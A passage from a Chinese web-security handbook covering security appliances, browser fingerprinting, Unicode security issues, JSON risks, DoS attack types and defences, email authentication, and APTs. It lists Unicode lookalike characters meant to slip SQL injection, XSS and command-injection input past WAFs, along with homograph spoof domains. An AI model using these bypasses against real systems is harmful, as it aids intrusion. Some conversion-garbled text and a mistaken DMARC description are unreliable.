更关心的是是否执行组织的安保策略。如果检测的活动违反了组织的安保策略就触发报警。使用这种方法的 IPS，要把安全策略写入设备之中。</span></p><p><span>基于协议分析的 IPS 与基于特征的方法类似。大多数情况检查常见的特征，但基于协议分析的方法可以做更深入的数据包检查，能更灵活地发现某些类型的攻击。</span></p></blockquote><h3 id='安全隔离网闸'><span>安全隔离网闸</span></h3><h4 id='简介-50'><span>简介</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>安全隔离网闸是使用带有多种控制功能的固态开关读写介质连接两个独立网络系统的信息安全设备。由于物理隔离网闸所连接的两个独立网络系统之间，不存在通信的物理连接、逻辑连接、信息传输命令、信息传输协议，不存在依据协议的信息包转发，只有数据文件的无协议</span>“<span>摆渡</span>”<span>， 对固态存储介质只有</span>“<span>读</span>”<span>和</span>“<span>写</span>”<span>两个命令。所以，物理隔离网闸从物理上隔离、阻断了具有潜在攻击可能的一切连接，使攻击者无法入侵、无法攻击、无法破坏，实现了真正的安全。</span></p></blockquote><h4 id='主要功能-2'><span>主要功能</span></h4><blockquote><p><span>阻断网络的直接物理连接：物理隔离网闸在任何时刻都只能与非可信网络和可信网络上之一相连接，而不能同时与两个网络连接。</span></p><p><span>阻断网络的逻辑连接：物理隔离网闸不依赖操作系统、不支持 TCP/IP 协议。两个网络之间的信息交换必须将 TCP/IP 协议剥离，将原始数据通过 P2P 的非 TCP/IP 连接方式，通过存储介质的</span>“<span>写入</span>”<span>与</span>“<span>读出</span>”<span>完成数据转发。</span></p><p><span>安全审查：物理隔离网闸具有安全审查功能，即网络在将原始数据</span>“<span>写入</span>”<span>物理隔离网闸前，根据需要对原始数据的安全性进行检查，把可能的病毒代码、恶意攻击代码过滤掉。</span></p><p><span>原始数据无危害性：物理隔离网闸转发的原始数据，不具有攻击或对网络安全有害的特性。管理和控制功能：建立完善的日志系统。</span></p><p><span>根据需要建立数据特征库：在应用初始化阶段，结合应用要求，提取应用数据的特征，形成用户特有的数据特征库，作为运行过程中数据校验的基础。当用户请求时，提取用户的应用数据，抽取数据特征和原始数据特征库比较，符合原始特征库的数据请求进入请求队列，不符合的返回用户，实现对数据的过滤。</span></p><p><span>根据需要提供定制安全策略和传输策略的功能：用户可以自行设定数据的传输策略，如：传输单位（基于数据还是基于任务）、传输间隔、传输方向、传输时间、启动时间等。</span></p><p><span>支持定时/实时文件交换；支持支持单向/双向文件交换；支持数字签名、内容过滤、病毒检查等功能。</span></p></blockquote><h3 id='vpn-设备'><span>VPN 设备</span></h3><h4 id='简介-51'><span>简介</span></h4><blockquote><p><span>虚拟专用网络指的是在公用网络上建立专用网络的技术。之所以称为虚拟网主要是因为整个 VPN 网络的任意两个节点之间的连接并没有传统专网所需的端到端的物理链路，而是架构在公用网络服务商所提供的网络平台之上的逻辑网络，用户数据在逻辑链路中传输。</span></p></blockquote><h4 id='常用技术'><span>常用技术</span></h4><blockquote><p><span>MPLS VPN：是一种基于 MPLS 技术的 IP VPN，是在网络路由和交换设备上应用 MPLS（多协议标记交换）技术，简化核心路由器的路由选择方式，利用结合传统路由技术的标记交换实现的 IP 虚拟专用网络（IP VPN）。MPLS 优势在于将二层交换和三层路由技术结合起来，在解决 VPN、服务分类和流量工程这些 IP网络的重大问题时具有很优异的表现。因此，MPLS VPN 在解决企业互连、提供各种新业务方面也越来越被运营商看好，成为在 IP 网络运营商提供增值业务的重要手段。MPLS VPN 又可分为二层 MPLS VPN（即 MPLS L2 VPN）和三层 MPLS VPN（即 MPLS L3 VPN）。</span></p><p><span>SSL VPN：是以 HTTPS（SecureHTTP，安全的 HTTP，即支持 SSL 的 HTTP 协议）为基础的 VPN 技术，工作在传输层和应用层之间。SSL VPN 充分利用了 SSL 协议提供的基于证书的身份认证、数据加密和消息完整性验证机制，可以为应用层之间的通信建立安全连接。SSL VPN 广泛应用于基于 Web 的远程安全接入，为用户远程访问公司内部网络提供了安全保证。</span></p><p><span>IPSecVPN 是基于 IPSec 协议的 VPN 技术，由 IPSec 协议提供隧道安全保障。IPSec 是一种由 IETF 设计的端到端的确保基于 IP 通讯的数据安全性的机制。它为 Internet 上传输的数据提供了高质量的、可互操作的、基于密码学的安全保证。</span></p></blockquote><h3 id='安全审计系统'><span>安全审计系统</span></h3><h4 id='简介-52'><span>简介</span></h4><blockquote><p><span>网络安全审计系统针对互联网行为提供有效的行为审计、内容审计、行为报警、行为控制及相关审计功能。从管理层面提供互联网的有效监督，预防、制止数据泄密。满足用户对互联网行为审计备案及安全保护措施的要求，提供完整的上网记录，便于信息追踪、系统安全管理和风险防范。</span></p></blockquote><ol start='7' ><li><h3 id='参考链接-参考链接-57'><span>参考链接 {#参考链接-57}</span></h3><ul><li><a href='https://wenku.baidu.com/view/2b5540cca32d7375a517806a.html'><span>网络安全设备</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='3' ><li><h2 id='指纹-2'><span>指纹</span></h2><ol start='' ><li><h3 id='浏览器指纹'><span>浏览器指纹</span></h3><ul><li><h4 id='软件细节'><span>软件细节</span></h4><ul><li><span>navigator</span></li><li><span>安装插件</span></li><li><span>浏览器支持的特性</span></li><li><span>CSS 支持</span></li><li><span>JavaScript 特性</span></li><li><span>已安装字体</span></li></ul></li></ul></li></ol></li></ol><blockquote><p><strong>–</strong><span> </span><span>.</span><span>..</span></p></blockquote><ul><li><h4 id='webgl-信息'><span>WebGL 信息</span></h4><ul><li><span>GL 版本</span></li><li><span>纹理大小</span></li><li><span>渲染缓冲区</span></li><li><span>WebGL 扩展</span></li></ul></li></ul><blockquote><p><strong>–</strong><span> </span><span>.</span><span>..</span></p></blockquote><ul><li><h4 id='硬件信息'><span>硬件信息</span></h4></li></ul><blockquote><p><strong><span>12.4. 指纹</span></strong><span> </span><strong><span>389</span></strong></p></blockquote><ul><li><span>电池 API</span></li><li><span>传感器 API</span></li><li><span>WebRTC 获取流媒体设备</span></li><li><span>系统性能</span></li></ul><blockquote><p><strong>–</strong><span> </span><span>.</span><span>..</span></p></blockquote><ul><li><h4 id='持久化存储'><span>持久化存储</span></h4><ul><li><span>cookie</span></li><li><span>localStorage</span></li><li><span>indexedDB</span></li><li><span>sessionStorage</span></li></ul></li><li><h4 id='系统设置'><span>系统设置</span></h4><ul><li><span>时钟偏移</span></li></ul></li><li><h4 id='主动探测'><span>主动探测</span></h4><ul><li><span>构造特定 DNS 请求并发送</span></li></ul></li></ul><ol start='2' ><li><h3 id='参考链接-参考链接-58'><span>参考链接 {#参考链接-58}</span></h3><ul><li><a href='https://mp.weixin.qq.com/s/ClG5cgv9Cu7zoyPcWOoU4A'><span>设备指纹指南</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='4' ><li><h2 id='unicode'><span>Unicode</span></h2><ol start='' ><li><h3 id='基本概念-4'><span>基本概念</span></h3></li></ol></li></ol><h4 id='bmp'><span>BMP</span></h4><blockquote><p><span>BMP (Basic Multilingual Plane)，译作基本多文种平面，是 Unicode 中的一个编码区块。</span></p></blockquote><h4 id='码平面'><span>码平面</span></h4><blockquote><p><span>Unicode 编码点分为 17 个平面（plane），每个平面包含 2\^16（即 65536）个码位。17 个平面的码位可表示为从 U+xx0000 到 U+xxFFFF，其中 xx 表示十六进制值从 0016 到 1016，共计 17 个平面。</span></p></blockquote><h4 id='code-point'><span>Code Point</span></h4><blockquote><p><span>Code Point 也被称作 Code Position，译作码位或编码位置，是指组成代码空间的数值。</span></p></blockquote><h4 id='code-unit'><span>Code Unit</span></h4><blockquote><p><span>指某种 Unicode 编码方式里编码一个 Code Point 需要的最少字节数，比如 UTF-8 需要最少一个字节，UTF- 16 最少两个字节，UCS-2 两个字节，UCS-4 和 UTF-32 四个字节。</span></p></blockquote><h4 id='surrogate-pair'><span>Surrogate Pair</span></h4><blockquote><p><span>Surrogate Pair 是用于 UTF-16 的以向后兼容 UCS-2 的，做法是取 UCS-2 范围里的 0xD800</span><span>~</span><span>0xDBFF (称为 high surrogates) 和 0xDC00</span><span>~</span><span>0xDFFF (称为 low surrogates) 的码位，一个 high surrogate 接一个 low surrogate 拼成四个字节表示超出 BMP 的字符，两个 surrogate range 都是 1024 个码位，所以 surrogate pair可以表达 1024 x 1024 = 1048576 = 0x100000 个字符。</span></p></blockquote><h4 id='combining-character'><span>Combining Character</span></h4><blockquote><p><span>例如 He̊llö 含有重音符号之类的字符，进行组合会使用大量的码位。所以这种字符多用组合的方式来实现。</span></p></blockquote><h4 id='bom'><span>BOM</span></h4><blockquote><p><span>字节顺序标记（byte-order mark，BOM）是一个有特殊含义的统一码字符，码点为 U+FEFF 。当以 UTF-16 或 UTF-32 来将 UCS 字符所组成的字符串编码时，这个字符被用来标示其字节序。常被用于区分是否为 UTF编码。</span></p></blockquote><h3 id='编码方式'><span>编码方式</span></h3><h4 id='ucs-2'><span>UCS-2</span></h4><blockquote><p><span>UCS-2 (2-byte Universal Character Set) 是一种定长的编码方式，UCS-2 仅仅简单的使用一个 16 位码元来表示码位，也就是说编码范围在 0 到 0xFFFF 的码位范围内。</span></p></blockquote><h4 id='utf-8'><span>UTF-8</span></h4><blockquote><p><span>UTF-8（8-bit Unicode Transformation Format）是一种针对 Unicode 的可变长度字符编码，也是一种前缀码。它可以用一至四个字节对 Unicode 字符集中的所有有效编码点进行编码，属于 Unicode 标准的一部分。编码方式如下</span></p></blockquote><p><span>[TABLE]</span></p><h4 id='utf-16'><span>UTF-16</span></h4><blockquote><p><span>UTF-16 (16-bit Unicode Transformation Format) 是 UCS-2 的拓展，用一个或者两个 16 位的码元来表示码位，可以对 0 到 0x10FFFF 的码位进行编码。</span></p></blockquote><h3 id='等价性问题'><span>等价性问题</span></h3><h4 id='简介-53'><span>简介</span></h4><blockquote><p><span>Unicode（统一码）包含了许多特殊字符，为了使得许多现存的标准能够兼容，提出了 Unicode 等价性（Unicode equivalence）。在字符中，有些在功能上会和其它字符或字符序列等价。因此，Unicode 将一些码位序列定义成相等的。</span></p><p><span>Unicode 提供了两种等价概念：标准等价和兼容等价。前者是后者的一个子集。例如，字符 n 后接着组合字符 </span><em><span>~</span></em><span> 会（标准和兼容）等价于 Unicode 字符 ñ。而合字 ff 则只有兼容等价于两个 f 字符。</span></p><p><span>Unicode 正规化是文字正规化的一种形式，是指将彼此等价的序列转成同一列序。此序列在 Unicode 标准中称作正规形式。</span></p><p><span>对于每种等价概念，Unicode 又定义两种形式，一种是完全合成的，一种是完全分解的。因此，最后会有四种形式，其缩写分别为：NFC、NFD、NFKC、NFKD。对于 Unicode 的文字处理程序而言，正规化是很重要的。因为它影响了比较、搜索和排序的意义。</span></p></blockquote><h4 id='标准等价'><span>标准等价</span></h4><blockquote><p><span>统一码中标准等价的基础概念为字符的组成和分解的交互使用。合成指的是将简单的字符合并成较少的预组字符的过程，如字符 n 和组合字符 </span><em><span>~</span></em><span> 可以组成统一码 ñ。分解则是反向过程，即将预组字符变回部件。</span></p><p><span>标准等价是指保持视觉上和功能上的等价。例如，含附加符号字母被视为和分解后的字母及其附加符号是标准等价。换句话说，预组字符</span>’<span>ü</span>’<span>和由</span>’<span>u</span>’<span>及</span>’<span>¨</span>’<span>所组成的序列是标准等价。相似地，统一码统合了一些希腊附加符号和外观与附加符号类似的标点符号。</span></p></blockquote><h4 id='兼容等价'><span>兼容等价</span></h4><blockquote><p><span>兼容等价的范围较标准等价来得广。如果序列是标准等价的话就会是兼容等价，反之则未必对。兼容等价更关注在于纯文字的等价，并把一些语义上的不同形式归结在一起。</span></p><p><span>例如，上标数字和其所使用的数字是兼容等价，但非标准等价。其理由为下标和上标形式虽然在某些时侯属于不同意义，但若应用程序将他们视为一样也是合理的（虽然视觉上可区分）。如此，在统一码富文件中，上标和下标就可以以比较不累赘地方式出现（见下一节）。</span></p><p><span>全角和半角的片假名也是一种兼容等价但不是标准等价。如同合字和其部件序列。其只有视觉上但没有语义上的区别。换句话说，作者通常没有特别宣称使用合字是一种意思，而不使用是另一种意思。相对地，这尽限于印刷上的选择。</span></p><p><span>文字处理软件在实现统一码字符串的搜索和排序时，须考虑到等价性的存在。如果没有此特性的话，用户在搜索时将无法找到在视觉上无法区分的字形。</span></p><p><span>统一码提供了一个标准的正规化算法，可将所有相同的序列产生一个唯一的序列。其等价准绳可以为标准的</span></p><p><span>（NF）或兼容的（NFK）。既然可以任意选择等价类中的元素，对每一个等价标准有多个标准形式也是有可能的。统一码为每一种等价准绳分别提供两种正规形式：合成用的 NFC 和 NFKC 以及分解用的 NFD 和 NFKD。而不论是组合的或分解的形式，都会使用标准顺序，以此限制正规形式只有唯一形式。</span></p></blockquote><h4 id='正规化'><span>正规化</span></h4><blockquote><p><span>为了比较或搜索统一码字符串，软件可以使用合成或分解形式其中之一。只要被比较或搜索的字符串使用的形式是相同的，哪种选择都没关系。另一方面，等价概念的选择则会影响到搜索结果。譬如，有些合字如 ffi</span></p><p><span>（U+FB03）、罗马数字如 （U+2168），甚至是上标数字如 5（U+2075）有其个别统一码码位。标准正规形式</span></p><p><span>并不会影响这些结果。但兼容正规形式会分解 ffi 成 f、f、i。所以搜索 U+0066（f）时，在 NFKC 中会成功，但在 NFC 则会失败。同样地有在预组罗马数字 中搜索拉丁字母 I（U+0049）。类似地，</span>“<span>5</span>”<span>会转成</span>“<span>5</span>”<span>。</span></p><p><span>对于浏览器，将上标转换成到基下划线未必是好的，因为上标的信息会因而消失。为了允许这种不同，统一码字符数据库句含了兼容格式标签，其提供了兼容转换的细节。在合字的情况下，这个标签只是 </span><span>&lt;</span><span>compat</span><span>&gt;</span><span> ，而在上标的情况下则为 </span><span>&lt;</span><span>super</span><span>&gt;</span><span> 。丰富文件格式如超文本置标语言则会使用兼容标签。例如，HTML 使用自定义标签来将</span>“<span>5</span>”<span>放到上标位置。</span></p></blockquote><h4 id='正规形式'><span>正规形式</span></h4><ul><li><p><span>NFD Normalization Form Canonical Decomposition 以标准等价方式来分解</span></p></li><li><p><span>NFC Normalization Form Canonical Composition 以标准等价方式来分解，然后以标准等价重组之。若是 singleton 的话，重组结果有可能和分解前不同。</span></p></li><li><p><span>NFKD Normalization Form Compatibility Decomposition 以兼容等价方式来分解 NFKC</span></p></li><li><p><span>Normalization Form Compatibility Composition 以兼容等价方式来分解，然后以标准等价重组之</span></p><ol start='' ><li><h3 id='tricks-5'><span>Tricks</span></h3><ul><li><span>部分语言的长度并不是字符的长度，一个 UTF-16 可能是两位。</span></li><li><span>部分语言在翻转 UTF-16 等多字节编码时，会处理错误。</span></li></ul></li><li><h3 id='安全问题-3'><span>安全问题</span></h3></li></ol></li></ul><h4 id='visual-spoofing'><span>Visual Spoofing</span></h4><blockquote><p><span>例如 b idu.com(此处的 a 为 u0430) 和 baidu.com(此处的 a 为 x61) 视觉上相同，但是实际上指向两个不同的域名。</span></p><p><span>b ａ idu.com(此处的 a 为 uff41) 和 baidu.com(此处的 a 为 x61) 有一定的不同，但是指向两个相同的域名。这种现象可以引起一些 Spoofing 或者 WAF Bypass 的问题。</span></p></blockquote><h4 id='best-fit'><span>Best Fit</span></h4><blockquote><p><span>如果两个字符前后编码不同，之前的编码在之后的编码没有对应，程序会尝试找最佳字符进行自动转换。当宽字符变成了单字节字符，字符编码会有一定的变化。</span></p><p><span>这种现象可能引起一些 WAF Bypass。</span></p></blockquote><h4 id='syntax-spoofing'><span>Syntax Spoofing</span></h4><blockquote><p><span>以下四个 Url 在语法上看来是没问题的域名，但是用来做分割的字符并不是真正的分割字符，而是 U+2044(</span></p><p><span>⁄ )，可以导致一些 UI 欺骗的问题。</span></p></blockquote><ul><li><a href='http://macchiato.com/x.bad.com' target='_blank' class='url'>http://macchiato.com/x.bad.com</a><span> macchiato.com/x bad.com</span></li><li><a href='http://macchiato.com/?x.bad.com'><span>http://macchiato.com?x.bad.com</span></a><span> macchiato.com?x bad.com</span></li><li><a href='http://macchiato.com.x.bad.com/'><span>http://macchiato.com.x.bad.com</span></a><span> macchiato.com.x bad.com</span></li><li><a href='http://macchiato.com/#x.bad.com'><span>http://macchiato.com#x.bad.com</span></a><span> macchiato.com#x bad.com</span></li></ul><h4 id='punycode-spoofs'><span>Punycode Spoofs</span></h4><ul><li><img src="media/image7.png" referrerpolicy="no-referrer"><span>http:// .com </span><a href='http://xn--google.com/'><span>http://xn</span><span>-</span><span>-google.com</span></a></li><li><img src="media/image7.png" referrerpolicy="no-referrer"><span>http:// .com </span><a href='http://xn--cnn.com/'><span>http://xn</span><span>-</span><span>-cnn.com</span></a></li><li><img src="media/image7.png" referrerpolicy="no-referrer"><a href='http://岍/'><span>http://岍</span></a><span> .com </span><a href='http://xn--citibank.com/'><span>http://xn</span><span>-</span><span>-citibank.com</span></a></li></ul><blockquote><p><span>有些浏览器会直接显示 puncode，但是也可以借助这种机制实现 UI Spooof。</span></p></blockquote><h4 id='buffer-overflows'><span>Buffer Overflows</span></h4><blockquote><p><span>在编码转换的时候，有的字符会变成多个字符，如 Fluß </span><em><span>→</span></em><span> FLUSS </span><em><span>→</span></em><span> fluss 这样可能导致 BOF。</span></p></blockquote><h3 id='常见载荷'><span>常见载荷</span></h3><h4 id='url-2'><span>URL</span></h4><ul><li><img src="media/image7.png" referrerpolicy="no-referrer"><span>(U+2025)</span></li><li><img src="media/image7.png" referrerpolicy="no-referrer"><span>(U+FE30)</span></li><li><span>。 (U+3002)</span></li><li><span>(U+24EA)</span></li><li><span>／ (U+FF0F)</span></li><li><span>ｐ (U+FF50)</span></li><li><span>(U+02B0)</span></li><li><span>ª (U+00AA)</span></li></ul><h4 id='sql-注入'><span>SQL 注入</span></h4><ul><li><span>＇ (U+FF07)</span></li><li><span>＂ (U+FF02)</span></li><li><span>(U+FE63)</span></li></ul><h4 id='xss-2'><span>XSS</span></h4><ul><li><span>＜ (U+FF1C)</span></li><li><span>＂ (U+FF02)</span></li></ul><h4 id='命令注入-2'><span>命令注入</span></h4><ul><li><span>＆ (U+FF06)</span></li><li><span>｜ (U+FF5C)</span></li></ul><h4 id='模板注入'><span>模板注入</span></h4><ul><li><img src="media/image7.png" referrerpolicy="no-referrer"><span>(U+FE5B)</span></li></ul><blockquote><p><span>•［ (U+FF3B)</span></p></blockquote><h3 id='参考链接-参考链接-59'><span>参考链接 {#参考链接-59}</span></h3><h4 id='官方文档-2'><span>官方文档</span></h4><ul><li><a href='https://en.wikipedia.org/wiki/Unicode_equivalence'><span>Unicode equivalence</span></a></li><li><a href='http://unicode.org/reports/tr15/'><span>Unicode Normalization Forms</span></a></li><li><a href='http://unicode.org/reports/tr36/'><span>Unicode Security Considerations</span></a></li></ul><h4 id='rfc-7'><span>RFC</span></h4><ul><li><a href='https://tools.ietf.org/html/rfc3629'><span>RFC 3629</span></a><span> UTF-8, a transformation format of ISO 10646</span></li><li><a href='https://tools.ietf.org/html/rfc2044'><span>RFC 2044</span></a><span> UTF-8, a transformation format of ISO 10646</span></li><li><a href='https://tools.ietf.org/html/rfc2279'><span>RFC 2279</span></a><span> UTF-8, a transformation format of ISO 10646</span></li></ul><h4 id='tricks--blogs'><span>Tricks / Blogs</span></h4><ul><li><a href='https://en.wikipedia.org/wiki/IDN_homograph_attack'><span>IDN homograph attack</span></a></li><li><a href='https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-PAPER.pdf'><span>Black Hat Unicode Security</span></a></li><li><a href='https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/'><span>Request encoding to bypass web application firewalls</span></a></li><li><a href='https://shkspr.mobi/blog/2018/11/domain-hacks-with-unusual-unicode-characters/'><span>domain hacks with unusual unicode characters</span></a></li><li><a href='https://zhuanlan.zhihu.com/p/53714077'><span>其实你并不懂 Unicode</span></a></li></ul><h1 id='json'><span>JSON</span></h1><blockquote><p><span>JSON (JavaScript Object Notation) 是许多数据格式通信的基石。</span></p></blockquote><ol start='' ><li><h3 id='安全风险'><span>安全风险</span></h3><ul><li><p><span>重复的 key {</span><span>&quot;</span><span>test</span><span>&quot;</span><span>: 1, </span><span>&quot;</span><span>test</span><span>&quot;</span><span>: 2}</span></p></li><li><p><span>特殊的 key 值 </span><span>\</span><span>x00 </span><span>\</span><span>x0d </span><span>\</span><span>ud800 </span><span>&quot;</span><span> 等</span></p></li><li><p><span>序列化</span></p></li><li><h4 id='特定的数值'><span>特定的数值</span></h4><ul><li><span>超过上限的整数</span></li><li><span>科学计数法</span></li><li><span>null 值的不同表示</span></li></ul></li></ul></li><li><h3 id='参考链接-参考链接-60'><span>参考链接 {#参考链接-60}</span></h3></li></ol><h4 id='相关规范'><span>相关规范</span></h4><ul><li><a href='https://tools.ietf.org/html/rfc8259'><span>RFC 8259 The JavaScript Object Notation (JSON) Data Interchange Format</span></a></li><li><a href='https://www.ecma-international.org/publications-and-standards/standards/ecma-404/'><span>ECMA-404 The JSON data interchange syntax</span></a></li><li><a href='https://json5.org/'><span>json5</span></a></li></ul><ol start='2' ><li><h2 id='拒绝服务攻击-2'><span>拒绝服务攻击</span></h2><ol start='' ><li><h3 id='简介-54'><span>简介</span></h3></li></ol></li></ol><blockquote><p><span>DoS（Denial of Service）指拒绝服务，是一种常用来使服务器或网络瘫痪的网络攻击手段。</span></p><p><span>在平时更多提到的是分布式拒绝服务（DDoS，Distributed Denial of Service）攻击，该攻击是指利用足够数量的傀儡计算机产生数量巨大的攻击数据包，对网络上的一台或多台目标实施 DDoS 攻击，成倍地提高威力，从而耗尽受害目标的资源，迫使目标失去提供正常服务的能力。</span></p></blockquote><h3 id='udp-反射'><span>UDP 反射</span></h3><blockquote><p><span>基于 UDP 文的反射 DDoS 攻击是拒绝服务攻击的一种形式。攻击者不直接攻击目标，而是利用互联网中某些开放的服务器，伪造被攻击者的地址并向该服务器发送基于 UDP 服务的特殊请求报文，使得数倍于请求报文的数据被发送到被攻击 IP，从而对后者间接形成 DDoS 攻击。</span></p><p><span>常用于 DoS 攻击的服务有:</span></p></blockquote><ul><li><span>NTP</span></li><li><span>DNS</span></li><li><span>SSDP</span></li><li><span>Memcached</span></li></ul><blockquote><p><span>其中 DNS 攻击主要是指 DNS Request Flood、DNS Response Flood、虚假源 + 真实源 DNS Query Flood、权威服务器攻击和 Local 服务器攻击。</span></p></blockquote><h3 id='tcp-flood'><span>TCP Flood</span></h3><blockquote><p><span>TCP Flood 是一种利用 TCP 协议缺陷的攻击，这种方式通过伪造 IP 向攻击服务器发送大量伪造的 TCP SYN 请求，被攻击服务器回应握手包后（SYN+ACK），因为伪造的 IP 不会回应之后的握手包，服务器会保持在 SYN_RECV 状态，并尝试重试。这会使得 TCP 等待连接队列资源耗尽，正常业务无法进行。</span></p></blockquote><h3 id='shrew-ddos'><span>Shrew DDoS</span></h3><blockquote><p><span>Shrew DDoS 利用了 TCP 的重传机制，调整攻击周期来反复触发 TCP 协议的 RTO，达到攻击的效果。其数据包以固定的、恶意选择的慢速时间发送，这种模式能够将 TCP 流量限制为其理想速率的一小部分，同时以足够低的平均速率进行传输以避免检测。</span></p><p><span>现代操作系统已经对 TCP 协议进行了相应的修改，使得其不受影响。</span></p></blockquote><h3 id='ping-of-death'><span>Ping Of Death</span></h3><blockquote><p><span>在正常情况下不会存在大于 65536 个字节的 ICMP 包，但是报文支持分片重组机制。通过这种方式可以发送大于 65536 字节的 ICMP 包并在目标主机上重组，最终会导致被攻击目标缓冲区溢出，引起拒绝服务攻击。</span></p><p><span>现代操作系统已经对这种攻击方式进行检查，使得其不受影响。</span></p></blockquote><h3 id='challenge-collapsar-cc'><span>Challenge Collapsar (CC)</span></h3><blockquote><p><span>CC 攻击是一种针对资源的 DoS 攻击，攻击者通常会常用请求较为消耗服务器资源的方式来达到目的。</span></p><p><span>CC 攻击的方式有很多种，常见的攻击可以通过大量访问搜索页、物品展示页等消耗大的功能来实现。部分</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>HTTP 服务器也可通过上传超大文件、发送大量 复杂的参数的请求来实现攻击。</span></p></blockquote><h3 id='慢速攻击'><span>慢速攻击</span></h3><blockquote><p><span>HTTP 慢速攻击是由 Wong Onn Chee 和 Tom Brennan 在 2012 年的 OWASP 大会上正式披露，用低速发包来消耗服务器资源以达到拒绝服务的目的。</span></p><p><span>慢速攻击分为 Slow headers / Slow body / Slow read 三种攻击方式。Slow headers 一直不停的慢速发送 HTTP 头部，消耗服务器的连接和内存资源。Slow body 发送一个 Content-Length 很大的 HTTP POST 请求，每次只发送很少量的数据，使该连接一直保持存活。Slow read 以很低的速度读取 Response。</span></p></blockquote><ol start='8' ><li><h3 id='基于服务特性'><span>基于服务特性</span></h3><ul><li><h4 id='压缩包解压'><span>压缩包解压</span></h4><ul><li><span>巨大的 0 字节的压缩包</span></li></ul></li><li><h4 id='读文件'><span>读文件</span></h4><ul><li><span>读 /dev/urandom 等无限制的文件</span></li></ul></li><li><h4 id='受限制的反序列化'><span>受限制的反序列化</span></h4><ul><li><span>反序列化巨大的数组</span></li></ul></li><li><h4 id='正则解析'><span>正则解析</span></h4><ul><li><span>消耗巨大的回溯表达式</span></li></ul></li></ul></li><li><h3 id='常用的防护方式'><span>常用的防护方式</span></h3><ul><li><span>基于特定攻击的指纹检测攻击，对相应流量进行封禁/限速操作</span></li><li><span>对正常流量进行建模，对识别出的异常流量进行封禁/限速操作</span></li><li><span>基于 IP/端口进行综合限速策略</span></li><li><span>基于地理位置进行封禁/限速操作</span></li></ul></li><li><h3 id='参考链接-参考链接-61'><span>参考链接 {#参考链接-61}</span></h3><ul><li><a href='https://linuxacademy.com/howtoguides/posts/show/topic/13191-denial-of-service-dos'><span>linux academy dos</span></a></li><li><a href='https://github.com/shekyan/slowhttptest'><span>slowhttptest</span></a><span> Application Layer DoS attack simulator</span></li><li><a href='https://en.wikipedia.org/wiki/Slowloris_(computer_security)'><span>Slowloris wiki</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='3' ><li><h2 id='邮件安全'><span>邮件安全</span></h2><ol start='' ><li><h3 id='常用概念-3'><span>常用概念</span></h3></li></ol></li></ol><blockquote><p><span>邮件安全常用的概念是 SPF、DKIM 和 DMARC。其中 SPF (Sender Policy Framework) 是一条特殊的 DNS</span></p></blockquote><p><span>记录，用于设定合法的发送邮件的 IP。</span></p><blockquote><p><span>DKIM (DomainKeys Identified Mail) 将数字签名添加到电子邮件消息的标题中，使邮件服务器拥有确保邮件内容没有更改的能力，同样 DKIM 也存在于 DNS 中。通过查询 </span><span>&lt;</span><span>selector</span><span>&gt;</span><span>.</span><span>_</span><span>domainkey.example.com的 txt 记录查询。</span></p><p><span>DMARC(Domain-based Message Authentication): 通过查询 </span><span>&lt;</span><span>selector</span><span>&gt;</span><span>.</span><span>_</span><span>domainkey.example.com 的 txt</span></p><p><span>记录查询。</span></p></blockquote><ol start='4' ><li><h1 id='apt-2'><span>APT</span></h1><ol start='' ><li><h3 id='简介-55'><span>简介</span></h3></li></ol></li></ol><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>APT (Advanced Persistent Threat)，翻译为高级持续威胁。2006 年，APT 攻击的概念被正式提出，用来描述从 20 世纪 90 年代末到 21 世纪初在美国军事和政府网络中发现的隐蔽 持续的网络攻击。</span></p><p><span>APT 攻击多用于指利用互联网进行网络间谍活动，其目标大多是获取高价值的敏感情报或者控制目标系统，对目标系统有着非常严重的威胁。</span></p><p><span>发起 APT 攻击的通常是一个组织，其团体是一个既有能力也有意向持续而有效地进行攻击的实体。个人或者小团体发起的攻击一般不会被称为 APT，因为即使其团体有意图攻击特定目标，也很少拥有先进和持久的资源来完成相应的攻击行为。</span></p><p><span>APT 的攻击手段通常包括供应链攻击、社会工程学攻击、零日攻击和僵尸网络等多种方式。其基于这些攻击手段将将自定义的恶意代码放置在一台或多台计算机上执行特定的任务，并保持在较长的时间内不被发现。</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>和传统的大面积扫描的攻击方式不同，因为 APT 攻击通常只面向单一特定的目标， 多数攻击会综合一系列手段来完成一次 APT 攻击，使其有着非常高的隐蔽性和复杂性，让对 APT 攻击的检测变得相当困难。顾名思义，APT 的特征主要体现在下面这三个方面。</span></p></blockquote><h3 id='高级性advanced）'><span>高级性（Advanced）</span></h3><blockquote><p><span>APT 攻击会结合当前所有可用的攻击手段和技术，使得攻击具有极高的隐蔽性和渗透性。</span></p><p><span>网络钓鱼就是其中的一种攻击方式。攻击者通常会结合社会工程学等手段来伪造可信度非常高的电子邮件，冒充目标信任的公司或者组织来发送难以分辨真假的对目标诱惑度很高恶意电子邮件。通过这些邮件来诱使被受害者访问攻击者控制的网站或者下载恶意代码。</span></p><p><span>APT 攻击通常还会采用其他的方式来伪装自己的攻击行为，从而实现规避安全系统检测的目的。比如有的恶意代码会通过伪造合法签名来逃避杀毒软件检测。以震网病毒为例，其在攻击时就使用了白加黑的模式，利用合法的证书对其代码进行了签名，这种攻击方式会使得大部分恶意代码查杀引擎会直接认为恶意代码是合法的，而不进行任何的检测。</span></p><p><span>除了利用合法签名绕过检测，APT 攻击者在攻击过程中也经常利用第三方的站点作为媒介来攻击目标，而不是使用传统的点到点攻击模式。这种模式通常被称为水坑攻击。</span></p><p><span>水坑攻击是一种入侵的手法，一般来说，是在攻击者对目标有一定了解后，确定攻击目标经常访问的网站，而后入侵其中的一个或几个网站，并对这些网站植入恶意代码，最后来实现借助该网站感染目标的能力。因为这种攻击借助了目标信任的第三方网站，攻击的成功率相对钓鱼攻击来说要高出很多。</span></p><p><span>另外一个能体现 APT 攻击高级性的特征是零日漏洞，目前国际上黑市一个零日漏洞的价格在数十万到数百万不等，每一个零日漏洞的稳定利用都需要大量的资源投入。而在 APT 攻击中，零日漏洞的利用非常广泛。以 APT28 为例，据统计，仅 2015 年一年当中 APT28 